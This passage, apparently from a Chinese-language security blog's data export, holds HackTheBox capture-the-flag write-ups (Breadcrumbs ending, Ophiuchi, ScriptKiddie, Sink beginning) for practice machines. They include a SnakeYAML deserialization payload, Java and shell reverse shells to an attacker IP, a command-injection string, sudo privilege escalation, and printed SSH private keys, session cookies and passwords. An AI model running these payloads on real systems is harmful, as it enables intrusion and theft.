&#39;http:&#x2F;&#x2F;127.0.0.1:1234&#x2F;index.php?method&#x3D;select&amp;username&#x3D;administrator&amp;table&#x3D;passwords&#39; selectarray(1) &#123; [0]&#x3D;&gt; array(1) &#123; [&quot;aes_key&quot;]&#x3D;&gt; string(16) &quot;k19D193j.&lt;19391(&quot; &#125;&#125; sql dump可以直接sqlmap跑出来其他数据： 1234sqlmap -u http:&#x2F;&#x2F;127.0.0.1:1234&#x2F;index.php\\?method\\&#x3D;select\\&amp;username\\&#x3D;administrator\\&amp;table\\&#x3D;passwords --dumpaes_key : k19D193j.&lt;19391(password : H2dFz&#x2F;jNwtSTWDURot9JBhWMP6XOdmcpgqvYHG35QKw&#x3D; aes decrypt然后aes解出来明文密码： 123https:&#x2F;&#x2F;gchq.github.io&#x2F;CyberChef&#x2F;#recipe&#x3D;From_Base64(&#39;A-Za-z0-9%2B&#x2F;%3D&#39;,false)AES_Decrypt(%7B&#39;option&#39;:&#39;Latin1&#39;,&#39;string&#39;:&#39;k19D193j.%3C19391(&#39;%7D,%7B&#39;option&#39;:&#39;Hex&#39;,&#39;string&#39;:&#39;0000000000000000000000000000000&#39;%7D,&#39;CBC&#39;,&#39;Raw&#39;,&#39;Raw&#39;,%7B&#39;option&#39;:&#39;Hex&#39;,&#39;string&#39;:&#39;&#39;%7D,%7B&#39;option&#39;:&#39;Hex&#39;,&#39;string&#39;:&#39;undefined&#39;%7D)&amp;input&#x3D;SDJkRnovak53dFNUV0RVUm90OUpCaFdNUDZYT2RtY3BncXZZSEczNVFLdz0p@ssw0rd!@#$9890.&#x2F; root flagadministrator ssh登录,桌面得到root.txt: 参考资料 free no credits Breadcrumbs admin ssh + description tutorial | RaidForumshttps://raidforums.com/Thread-Free-Flag-free-no-credits-Breadcrumbs-admin-ssh-description-tutorial","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Ophiuchi - HackTheBox","slug":"Ophiuchi-HackTheBox","date":"2021-02-18T06:11:29.000Z","updated":"2021-07-05T00:51:22.814Z","comments":true,"path":"2021/02/18/Ophiuchi-HackTheBox/","link":"","permalink":"https://darkwing.moe/2021/02/18/Ophiuchi-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/315 10.10.10.227 端口扫描22和8080: 123456789101112131415161718$ nmap -sC -sV 10.10.10.227Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-18 13:16 CSTNmap scan report for 10.10.10.227Host is up (0.068s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 6d:fc:68:e2:da:5e:80:df:bc:d0:45:f5:29:db:04:ee (RSA)| 256 7a:c9:83:7e:13:cb:c3:f9:59:1e:53:21:ab:19:76:ab (ECDSA)|_ 256 17:6b:c3:a8:fc:5d:36:08:a1:40:89:d2:f4:0a:c6:46 (ED25519)8080/tcp open http Apache Tomcat 9.0.38|_http-open-proxy: Proxy might be redirecting requests|_http-title: Parse YAMLService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 29.12 seconds 8080一个在线的yaml parser： YAML简单的搜索： SnakeYaml Deserilization exploited | by Swapneil Kumar Dash | Mediumhttps://medium.com/@swapneildash/snakeyaml-deserilization-exploited-b4a2c5ac0858 artsploit/yaml-payload: A tiny project for generating SnakeYAML deserialization payloadshttps://github.com/artsploit/yaml-payload test12345!!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL [\"http://10.10.14.6:4444/\"] ]]] payload直接用github的payload改下代码： https://github.com/artsploit/yaml-payload 修改src/artsploit/AwesomeScriptEngineFactory.java文件： 1234567891011public AwesomeScriptEngineFactory() &#123; String [] cmd=&#123;\"bash\",\"-c\",\"bash -i &gt;&amp; /dev/tcp/10.10.14.6/4444 0&gt;&amp;1\"&#125;; String [] jex=&#123;\"bash\",\"-c\",\"&#123;echo,$(echo -n $cmd | base64)&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\"&#125;; try &#123; Runtime.getRuntime().exec(cmd); Runtime.getRuntime().exec(jex); Runtime.getRuntime().exec(\"echo $jex\"); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125; 然后重新编译，启动server： 123javac src/artsploit/AwesomeScriptEngineFactory.javacd srcpython -m SimpleHTTPServer 7777 exploit监听端口，8080端口发送payload，打到tomcat用户shell： 123456789# payload!!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL [&quot;http:&#x2F;&#x2F;10.10.14.6:7777&#x2F;&quot;] ]]]# reverse shell nc -lvvp 4444 tomcat to admintomcat配置文件里得到admin用户密码： 1admin : whythereisalimit user flagadmin可以直接ssh登录，得到user.txt: 提权信息sudo -l查看sudo发现可以无密码运行一个go文件： 查看代码发现是检查当前目录main.wasm中info值是否为1，为1则运行当前目录deply.sh文件,wasm文件也下载下来分析： 12nc 10.10.14.6 4444 &lt; main.wasmnc -lvvp 4444 &gt; main.wasm wasm在线网站上传wasm文件解析： https://webassembly.github.io/wabt/demo/wasm2wat/index.html 发现info设置的0，修改为1后在这里编译下载： https://webassembly.github.io/wabt/demo/wat2wasm/index.html index.go1234567891011121314151617181920212223242526272829package mainimport ( \"fmt\" wasm \"github.com/wasmerio/wasmer-go/wasmer\" \"os/exec\" \"log\")func main() &#123; bytes, _ := wasm.ReadBytes(\"main.wasm\") instance, _ := wasm.NewInstance(bytes) defer instance.Close() init := instance.Exports[\"info\"] result,_ := init() f := result.String() if (f != \"1\") &#123; fmt.Println(\"Not ready to deploy\") &#125; else &#123; fmt.Println(\"Ready to deploy\") out, err := exec.Command(\"/bin/sh\", \"deploy.sh\").Output() if err != nil &#123; log.Fatal(err) &#125; fmt.Println(string(out)) &#125;&#125; 提权 &amp;&amp; root flag然后就是在一个可写目录里准备好修改后的main.wasm和deply.sh文件，运行命令,可以简单的直接给bash suid(做完记得改回来，别影响其他人)： 1234wget http://10.10.14.6:7777/test.wasm -O main.wasmecho \"chmod +s /bin/bash\" &gt; deploy.shchmod 777 *sudo -u root /usr/bin/go run /opt/wasm-functions/index.go 参考资料 SnakeYaml Deserilization exploited | by Swapneil Kumar Dash | Mediumhttps://medium.com/@swapneildash/snakeyaml-deserilization-exploited-b4a2c5ac0858 artsploit/yaml-payload: A tiny project for generating SnakeYAML deserialization payloadshttps://github.com/artsploit/yaml-payload https://webassembly.github.io/wabt/demo/wasm2wat/index.html https://webassembly.github.io/wabt/demo/wat2wasm/index.html Hack the Box Opiuchi Full Writeup | RaidForumshttps://raidforums.com/Thread-Tutorial-Hack-the-Box-Opiuchi-Full-Writeup Ophiuchi – Jopraveenhttps://jopraveen.wordpress.com/2021/02/14/ophiuchi/","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"ScriptKiddie - HackTheBox","slug":"ScriptKiddie-HackTheBox","date":"2021-02-07T06:18:19.000Z","updated":"2021-06-07T05:16:01.761Z","comments":true,"path":"2021/02/07/ScriptKiddie-HackTheBox/","link":"","permalink":"https://darkwing.moe/2021/02/07/ScriptKiddie-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/314 10.10.10.226 端口扫描22和5000: 1234567891011121314151617$ nmap -sC -sV 10.10.10.226Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-07 13:28 CSTNmap scan report for 10.10.10.226Host is up (0.082s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)| 256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)|_ 256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)5000/tcp open http Werkzeug httpd 0.16.1 (Python 3.8.5)|_http-title: k1d'5 h4ck3r t00l5Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 26.15 seconds 5000在线的黑客工具，包括nmap，msf，searchsploit这些： msfvenommsf部分就是调用msfvenom生成文件，可以自定义template，这个之前出过漏洞： Rapid7 Metasploit Framework msfvenom APK Template Command Injectionhttps://www.rapid7.com/db/modules/exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection/ exploit就是msf自己打自己，用相关模块生成恶意apk模板,然后网页上去加载模板生成，得到reverse shell： user flag1python3 -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39; kid用户目录得到user.txt: kid用户.ssh目录有ssh私钥，保存下来方便后续操作 kid_id_rsa1234567891011121314151617181920212223242526272829303132333435363738-----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcnNhAAAAAwEAAQAAAYEArfzF1oqWR+L5hNJS8nE5cJNHhXBEIpZ0gsKUKCwPUBIhQDL6KTU4VsoxpLLehzT3Q70g5SRH07VuD2jhQLHlCAnMLonTF3OMXqbtbdIa37+Vp+0osEMCA8BNA70UUqSyK&#x2F;SNMH44xD573OMu7rjL7H9IXoGSzJwoYLLVlgsPfQ0uatGHV8ZCAu3ipSPdJx8lBy91C8FwwZOjVoT5ifdMg2hQuIg9MlT98Zoyo5dIqLZKm4SoUQA&#x2F;G1CDWe2p108OB29IhebTALbQfCWy7bOc74ELWK3IihOEJ5eBfjDucoNxtN7PVevSuEfk15iOE2SlB3xKTZ0XkPu97jqoIx+VXma9E5kixLM3xX10XL+7eI8Tm6GJ0vpYEdVdohh80pXvpwJVSx6pcD+UU7cGjsBNJ28pIoMs&#x2F;4eCjQp9K1OvX2Fkq5HBT2DkpvdkCpmjCbl6p8nI7qi5hzA9lykroZaYA&#x2F;1ZkC9+Au6Y7uIfv+&#x2F;KiudPorRtBQoksuiEXeQyH05FAAAFiOr2+K7q9viuAAAAB3NzaC1yc2EAAAGBAK38xdaKlkfi+YTSUvJxOXCTR4VwRCKWdILClCgsD1ASIUAy+ik1OFbKMaSy3oc090O9IOUkR9O1bg9o4UCx5QgJzC6J0xdzjF6m7W3SGt+&#x2F;laftKLBDAgPATQO9FFKksiv0jTB+OMQ+e9zjLu64y+x&#x2F;SF6BksycKGCy1ZYLD30NLmrRh1fGQgLt4qUj3ScfJQcvdQvBcMGTo1aE+Yn3TINoULiIPTJU&#x2F;fGaMqOXSKi2SpuEqFEAPxtQg1ntqddPDgdvSIXm0wC20Hwlsu2znO+BC1ityIoThCeXgX4w7nKDcbTez1Xr0rhH5NeYjhNkpQd8Sk2dF5D7ve46qCMflV5mvROZIsSzN8V9dFy&#x2F;u3iPE5uhidL6WBHVXaIYfNKV76cCVUseqXA&#x2F;lFO3Bo7ATSdvKSKDLP+Hgo0KfStTr19hZKuRwU9g5Kb3ZAqZowm5eqfJyO6ouYcwPZcpK6GWmAP9WZAvfgLumO7iH7&#x2F;vyornT6K0bQUKJLLohF3kMh9ORQAAAAMBAAEAAAGBAIxVIU1WIriAvjj&#x2F;W5&#x2F;o6yd942YhkxNCv17oio+MWh1&#x2F;QgqCE3xBTNvT4g6xpwLvGbEtTucDSFveLpOHSIfh9JVzMZkn2XdE36dIhKDbooluAcucYgEpSuqzpGqri0TNSlhhu6+tXyQKMeWL6ELsEq8CSuDPKhSWr4qvM879xNRcWWAW+E83ve6W6QPB1ZLEcB1HjeSZddTsvAYA4zUAnlovPUxZtuJt4xWIBeglEZniznJ5oTkUNdJWMlvKcf8T5yxpNxo0rbalHp5M1awvQbhD6saGMwrBwVpEcyhD4VNtwYtf6LVLXhhiMDldO2MNBe&#x2F;5wt1PheepM4zCGv3U2hHMfCWAGWnC43eKl5CWw5flIgFcVHTaiiWjFYecahmW8B4rcIzpmab3y86ZDN+8igsJ7yoTdmcbYDu0XGGi3epwiLjTk3KJlRiJLo1TuI6r+Tufqspw8LWAQ6wsqwxZKXnFB3KwDklRuOrA8Pl0ZyWERkn4OUIeJpRWC3gsEMV10QAAAMBc7MJJBoKireOUqp2RSn32dTh8iQGoTlnFcsbGf6rJmYuCOc&#x2F;oHoU+iwYfL3piMP6rrkUGQNgxlHff2yXztxDIW&#x2F;&#x2F;QkKNGrDLPohxOUz7PBEYaLAmcN1P8bl1aB1qPH3kFk2BFhKh2qF7p2AEseveOguUrIyuWuBnt7lFRzAhnnVaLNWCE1IoUprtBxjq8Cppt6P9EZ9zk7Fpz7giDUpzfBp04ytvppMBHzD2j2mbuPaGJ&#x2F;MTzENvR&#x2F;0QdYxAzEawAAADBANTOqPphSTxBCW3zlfzy3oLhqjaKwCNRrafF1jrfYPrY2xVfIu2p4RmL57lkCX2RxM7DxcYADBLUEBWDLq2mZuRpa+aqyLh+ThtJedWXmH3nq9fveObxuA&#x2F;LmuKJimbP5coqVEOPB4ddi7vow1C3mkZFc+aRGGdj7BBzP&#x2F;D5xKqDn+JBOhyRQa&#x2F;NgsXoXY1aicW3E0zJGU9VmwDp3NVhkWlzBjIa&#x2F;VmBGX2IjL43QKBWb&#x2F;RkR9DbRjhGk22LAOTm2wAAAMEA0U0OGnfXtDZx0mC9zMtK1ZdTSjtlJkiWpjmNwYz6XEJwr&#x2F;Uz2ZU+&#x2F;iPC3mgGM5E9Lr7ljIDEA6uu5ws9Z&#x2F;3DdAK2YluOen1Wo7kMeGdJyZ68o+AkowuOFowKfSRatbEby7OmLGpZNECJJyJqt+9GL4q2Pc&#x2F;eB88+5CtqJEpOIuMPsOeM4jMTD4DJbb&#x2F;8Jsh6yzW45V3bgPp1Hm4nI3AZ8SjSI4VqtO9CcDKtPnvh3&#x2F;jm5VEx9WbK3NNrAo9t2tlfAAAAEGtpZEBzY3JpcHRraWRkaWUBAg&#x3D;&#x3D;-----END OPENSSH PRIVATE KEY----- 提权信息pwn用户目录有个scanlosers.sh，查看内容是读特定文件处理后调用命令，这里可以命令注入 scanlosers.sh12345678910#!/bin/bashlog=/home/kid/logs/hackerscd /home/pwn/cat $log | cut -d' ' -f3- | sort -u | while read ip; do sh -c \"nmap --top-ports 10 -oN recon/$&#123;ip&#125;.nmap $&#123;ip&#125; 2&gt;&amp;1 &gt;/dev/null\" &amp;doneif [[ $(wc -l &lt; $log) -gt 0 ]]; then echo -n &gt; $log; fi Pwn 注意加两个空格,因为会经过cut处理： 12;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.10/4445 0&gt;&amp;1' #echo \" ;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.10/4445 0&gt;&amp;1' #\" &gt;&gt; hackers sudo -lPwn用户可以无密码sudo msfconsole: root flagmsf里可以直接执行系统命令： 123sudo /opt/metasploit-framework-6.0.9/msfconsolecd /rootcat root.txt 参考资料 Rapid7 Metasploit Framework msfvenom APK Template Command Injectionhttps://www.rapid7.com/db/modules/exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection/ Scriptkiddie Writeup (FREE) | RaidForumshttps://raidforums.com/Thread-Free-Flag-Scriptkiddie-Writeup-FREE","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Sink - HackTheBox","slug":"Sink-HackTheBox","date":"2021-02-02T06:31:18.000Z","updated":"2021-09-22T00:42:40.421Z","comments":true,"path":"2021/02/02/Sink-HackTheBox/","link":"","permalink":"https://darkwing.moe/2021/02/02/Sink-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/313 10.10.10.225 端口扫描22,3000,5000: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103$ nmap -sC -sV 10.10.10.225Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-02 12:41 CSTNmap scan report for 10.10.10.225Host is up (0.067s latency).Not shown: 997 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)| 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)|_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)3000/tcp open ppp?| fingerprint-strings:| GenericLines, Help:| HTTP/1.1 400 Bad Request| Content-Type: text/plain; charset=utf-8| Connection: close| Request| GetRequest:| HTTP/1.0 200 OK| Content-Type: text/html; charset=UTF-8| Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647| Set-Cookie: i_like_gitea=714cddd71aee2a02; Path=/; HttpOnly| Set-Cookie: _csrf=_ycfY9hBp5PAKQ-XJR1ggnsCr0o6MTYxMjI0MDg5ODI3MzYyNDA0NA; Path=/; Expires=Wed, 03 Feb 2021 04:41:38 GMT; HttpOnly| X-Frame-Options: SAMEORIGIN| Date: Tue, 02 Feb 2021 04:41:38 GMT| &lt;!DOCTYPE html&gt;| &lt;html lang=\"en-US\" class=\"theme-\"&gt;| &lt;head data-suburl=\"\"&gt;| &lt;meta charset=\"utf-8\"&gt;| &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"&gt;| &lt;meta http-equiv=\"x-ua-compatible\" content=\"ie=edge\"&gt;| &lt;title&gt; Gitea: Git with a cup of tea &lt;/title&gt;| &lt;link rel=\"manifest\" href=\"/manifest.json\" crossorigin=\"use-credentials\"&gt;| &lt;meta name=\"theme-color\" content=\"#6cc644\"&gt;| &lt;meta name=\"author\" content=\"Gitea - Git with a cup of tea\" /&gt;| &lt;meta name=\"description\" content=\"Gitea (Git with a cup of tea) is a painless| HTTPOptions:| HTTP/1.0 404 Not Found| Content-Type: text/html; charset=UTF-8| Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647| Set-Cookie: i_like_gitea=07991f7d68fd14ab; Path=/; HttpOnly| Set-Cookie: _csrf=xAWo2w_3nXPBKyseOI9cHESeZ3s6MTYxMjI0MDkwMzY0ODE1MzgyMg; Path=/; Expires=Wed, 03 Feb 2021 04:41:43 GMT; HttpOnly| X-Frame-Options: SAMEORIGIN| Date: Tue, 02 Feb 2021 04:41:43 GMT| &lt;!DOCTYPE html&gt;| &lt;html lang=\"en-US\" class=\"theme-\"&gt;| &lt;head data-suburl=\"\"&gt;| &lt;meta charset=\"utf-8\"&gt;| &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"&gt;| &lt;meta http-equiv=\"x-ua-compatible\" content=\"ie=edge\"&gt;| &lt;title&gt;Page Not Found - Gitea: Git with a cup of tea &lt;/title&gt;| &lt;link rel=\"manifest\" href=\"/manifest.json\" crossorigin=\"use-credentials\"&gt;| &lt;meta name=\"theme-color\" content=\"#6cc644\"&gt;| &lt;meta name=\"author\" content=\"Gitea - Git with a cup of tea\" /&gt;|_ &lt;meta name=\"description\" content=\"Gitea (Git with a c5000/tcp open http Gunicorn 20.0.0|_http-title: Sink Devops1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port3000-TCP:V=7.91%I=7%D=2/2%Time=6018D801%P=x86_64-apple-darwin19.6.0SF:%r(GenericLines,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:SF:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20SF:Bad\\x20Request\")%r(GetRequest,2943,\"HTTP/1\\.0\\x20200\\x20OK\\r\\nContent-TSF:ype:\\x20text/html;\\x20charset=UTF-8\\r\\nSet-Cookie:\\x20lang=en-US;\\x20PaSF:th=/;\\x20Max-Age=2147483647\\r\\nSet-Cookie:\\x20i_like_gitea=714cddd71aeeSF:2a02;\\x20Path=/;\\x20HttpOnly\\r\\nSet-Cookie:\\x20_csrf=_ycfY9hBp5PAKQ-XJRSF:1ggnsCr0o6MTYxMjI0MDg5ODI3MzYyNDA0NA;\\x20Path=/;\\x20Expires=Wed,\\x2003\\SF:x20Feb\\x202021\\x2004:41:38\\x20GMT;\\x20HttpOnly\\r\\nX-Frame-Options:\\x20SSF:AMEORIGIN\\r\\nDate:\\x20Tue,\\x2002\\x20Feb\\x202021\\x2004:41:38\\x20GMT\\r\\n\\SF:r\\n&lt;!DOCTYPE\\x20html&gt;\\n&lt;html\\x20lang=\\\"en-US\\\"\\x20class=\\\"theme-\\\"&gt;\\n&lt;hSF:ead\\x20data-suburl=\\\"\\\"&gt;\\n\\t&lt;meta\\x20charset=\\\"utf-8\\\"&gt;\\n\\t&lt;meta\\x20namSF:e=\\\"viewport\\\"\\x20content=\\\"width=device-width,\\x20initial-scale=1\\\"&gt;\\nSF:\\t&lt;meta\\x20http-equiv=\\\"x-ua-compatible\\\"\\x20content=\\\"ie=edge\\\"&gt;\\n\\t&lt;tSF:itle&gt;\\x20Gitea:\\x20Git\\x20with\\x20a\\x20cup\\x20of\\x20tea\\x20&lt;/title&gt;\\n\\tSF:&lt;link\\x20rel=\\\"manifest\\\"\\x20href=\\\"/manifest\\.json\\\"\\x20crossorigin=\\\"SF:use-credentials\\\"&gt;\\n\\t&lt;meta\\x20name=\\\"theme-color\\\"\\x20content=\\\"#6cc64SF:4\\\"&gt;\\n\\t&lt;meta\\x20name=\\\"author\\\"\\x20content=\\\"Gitea\\x20-\\x20Git\\x20withSF:\\x20a\\x20cup\\x20of\\x20tea\\\"\\x20/&gt;\\n\\t&lt;meta\\x20name=\\\"description\\\"\\x20cSF:ontent=\\\"Gitea\\x20\\(Git\\x20with\\x20a\\x20cup\\x20of\\x20tea\\)\\x20is\\x20a\\xSF:20painless\")%r(Help,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-TSF:ype:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400SF:\\x20Bad\\x20Request\")%r(HTTPOptions,206D,\"HTTP/1\\.0\\x20404\\x20Not\\x20FouSF:nd\\r\\nContent-Type:\\x20text/html;\\x20charset=UTF-8\\r\\nSet-Cookie:\\x20laSF:ng=en-US;\\x20Path=/;\\x20Max-Age=2147483647\\r\\nSet-Cookie:\\x20i_like_gitSF:ea=07991f7d68fd14ab;\\x20Path=/;\\x20HttpOnly\\r\\nSet-Cookie:\\x20_csrf=xAWSF:o2w_3nXPBKyseOI9cHESeZ3s6MTYxMjI0MDkwMzY0ODE1MzgyMg;\\x20Path=/;\\x20ExpiSF:res=Wed,\\x2003\\x20Feb\\x202021\\x2004:41:43\\x20GMT;\\x20HttpOnly\\r\\nX-FramSF:e-Options:\\x20SAMEORIGIN\\r\\nDate:\\x20Tue,\\x2002\\x20Feb\\x202021\\x2004:41SF::43\\x20GMT\\r\\n\\r\\n&lt;!DOCTYPE\\x20html&gt;\\n&lt;html\\x20lang=\\\"en-US\\\"\\x20class=SF:\\\"theme-\\\"&gt;\\n&lt;head\\x20data-suburl=\\\"\\\"&gt;\\n\\t&lt;meta\\x20charset=\\\"utf-8\\\"&gt;\\SF:n\\t&lt;meta\\x20name=\\\"viewport\\\"\\x20content=\\\"width=device-width,\\x20initiSF:al-scale=1\\\"&gt;\\n\\t&lt;meta\\x20http-equiv=\\\"x-ua-compatible\\\"\\x20content=\\\"iSF:e=edge\\\"&gt;\\n\\t&lt;title&gt;Page\\x20Not\\x20Found\\x20-\\x20\\x20Gitea:\\x20Git\\x20wSF:ith\\x20a\\x20cup\\x20of\\x20tea\\x20&lt;/title&gt;\\n\\t&lt;link\\x20rel=\\\"manifest\\\"\\xSF:20href=\\\"/manifest\\.json\\\"\\x20crossorigin=\\\"use-credentials\\\"&gt;\\n\\t&lt;metaSF:\\x20name=\\\"theme-color\\\"\\x20content=\\\"#6cc644\\\"&gt;\\n\\t&lt;meta\\x20name=\\\"autSF:hor\\\"\\x20content=\\\"Gitea\\x20-\\x20Git\\x20with\\x20a\\x20cup\\x20of\\x20tea\\\"SF:\\x20/&gt;\\n\\t&lt;meta\\x20name=\\\"description\\\"\\x20content=\\\"Gitea\\x20\\(Git\\x20SF:with\\x20a\\x20c\");Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 110.75 seconds 30003000是gitea： 50005000是devops： devops5000端口随意注册登录，查看请求响应发现haproxy和gunicorn： 这个搭配搜索资料发现请求走私漏洞： HAProxy HTTP request smuggling (CVE-2019-18277) - nathandavison.comhttps://nathandavison.com/blog/haproxy-http-request-smuggling 请求走私随意注册登录进去后提交评论，进行请求走私，然后会触发管理员的request，之后去home查看，管理员的request header会作为评论显示在那里： 1GET &#x2F;notes&#x2F;delete&#x2F;1234 HTTP&#x2F;1.1 Host: 127.0.0.1:8080 User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; rv:78.0) Gecko&#x2F;20100101 Firefox&#x2F;78.0 Accept-Encoding: gzip, deflate Accept: *&#x2F;* Cookie: session&#x3D;eyJlbWFpbCI6ImFkbWluQHNpbmsuaHRiIn0.YBjPNQ.saU-Xnc0tQ9KkDKoBF8EBw0zbMY X-Forwarded-For: 127.0.0.1 admin替换cookie，现在我们是管理员： notesadmin三个notes就是三个不同系统的账号密码： 12345Chef Login : http:&#x2F;&#x2F;chef.sink.htb Username : chefadm Password : &#x2F;6&#39;fEGC&amp;zEx&#123;4]zzDev Node URL : http:&#x2F;&#x2F;code.sink.htb Username : root Password : FaH@3L&gt;Z3&#125;)zzfQ3Nagios URL : https:&#x2F;&#x2F;nagios.sink.htb Username : nagios_adm Password : g8&lt;H6GK\\&#123;*L.fB3C gitea使用code那个用户名密码可以登录3000的gitea： 1root : FaH@3L&gt;Z3&#125;)zzfQ3 Key_Management在Key_Management的commits里可以找到marcus用户的私钥： marcus_id_rsa1234567891011121314151617181920212223242526272829303132333435363738-----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcnNhAAAAAwEAAQAAAYEAxi7KuoC8cHhmx75Uhw06ew4fXrZJehoHBOLmUKZj&#x2F;dZVZpDBh27dPogq1l&#x2F;CNSK3Jqf7BXLRh0oH464bs2RE9gTPWRARFNOe5sj1tg7IW1w76HYyhrNJpux&#x2F;+Eo0ZdYRwkP91+oRwdWXsCsj5NUkoOUp0O9yzUBOTwJeAwUTuF7Jal&#x2F;lRpqoFVs8WqggqQqGEEiE00TxF5Rk9gWc43wrzm2qkrwrSZycvUdMpvYGOXv5szkd27C08uLRaD7r45t77kCDtX4ebL8QLP5LDiMaiZguzuU3XwiNAyeUlJcjKLHH&#x2F;qe5mYpRQnDz5KkFDs&#x2F;UtqbmcxWbiuXaJhJvn5ykkwCBU5t5f0CKK7fYe5iDLXnyoJSPNEBzRSExp3hy3yFXvc1TgOhtiD1Dag4QEl0DzlNgMsPEGvYDXMe7ccsFuLtC+WWP+94ZCnPNRdqSDza5P6HlJ136ZX34S2uhVt5xFG5tTIn2BA5hRr8sTVolkRkLxx1J45WfpI&#x2F;8MhO+HMM&#x2F;AAAFiCjlruEo5a7hAAAAB3NzaC1yc2EAAAGBAMYuyrqAvHB4Zse+VIcNOnsOH162SXoaBwTi5lCmY&#x2F;3WVWaQwYdu3T6IKtZfwjUityan+wVy0YdKB+OuG7NkRPYEz1kQERTTnubI9bYOyFtcO+h2MoazSabsf&#x2F;hKNGXWEcJD&#x2F;dfqEcHVl7ArI+TVJKDlKdDvcs1ATk8CXgMFE7heyWpf5UaaqBVbPFqoIKkKhhBIhNNE8ReUZPYFnON8K85tqpK8K0mcnL1HTKb2Bjl7+bM5HduwtPLi0Wg+6+Obe+5Ag7V+Hmy&#x2F;ECz+Sw4jGomYLs7lN18IjQMnlJSXIyixx&#x2F;6nuZmKUUJw8+SpBQ7P1Lam5nMVm4rl2iYSb5+cpJMAgVObeX9Aiiu32HuYgy158qCUjzRAc0UhMad4ct8hV73NU4DobYg9Q2oOEBJdA85TYDLDxBr2A1zHu3HLBbi7Qvllj&#x2F;veGQpzzUXakg82uT+h5Sdd+mV9+EtroVbecRRubUyJ9gQOYUa&#x2F;LE1aJZEZC8cdSeOVn6SP&#x2F;DITvhzDPwAAAAMBAAEAAAGAEFXnC&#x2F;x0i+jAwBImMYOboG0HlOz9nXzruzFgvqEYeOHj5DJmYV14CyF6NnVqMqsL4bnS7R4Lu1UU1WWSjvTi4kx&#x2F;Mt4qKkdPP8KszjbluPIfVgf4HjZFCedQnQywyPweNp8YG2YF1K5gdHr52HDhNgntqnUyR0zXp5eQXDtc5sOZYpVI9srks+3zSZ22I3jkmA8CM8&#x2F;o94KZ19Wamv2vNrK&#x2F;bpzoDIdGPCvWW6TH2pEngehhV6x3HdYoYKlfFEHKjhN7uxX&#x2F;A3Bbvve3K1l+6uiDMIGTTlgDHWeHk1mi9SlO5YlcXEu6pkBMOwMcZpIjCBWRqSOwlD7&#x2F;DN7RydtObSEF3dNAZeu2tU29PDLusXcd9h0hQKxZ019j8T0UB92PO+kUjwsEN0hMBGtUp6ceyCH3xzoy+0Ka7oSDgU59ykJcYh7IRNP+fbnLZvggZjDm